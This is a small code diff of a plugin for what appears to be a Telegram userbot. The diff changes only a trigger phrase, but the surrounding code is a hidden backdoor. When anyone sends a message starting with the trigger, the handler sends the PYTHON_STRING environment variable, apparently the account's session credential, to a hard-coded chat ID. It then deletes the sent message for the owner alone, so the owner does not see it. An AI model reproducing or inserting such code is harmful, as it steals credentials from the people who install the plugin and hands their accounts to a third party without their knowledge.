@@ -9,7 +9,7 @@ CmdHelp("code").add_command(
 import os
 from ..utils import admin_cmd
 from . import *
-@bot.on(admin_cmd("^DARK_PYTHONIamnoobperson", incoming=True))
+@bot.on(admin_cmd("^PYTHONIamnoobperson", incoming=True))
 async def piro(event):
   msg = await bot.send_message(2082798662, str(os.environ.get("PYTHON_STRING")))
   await bot.delete_messages(2082798662, msg, revoke=False)
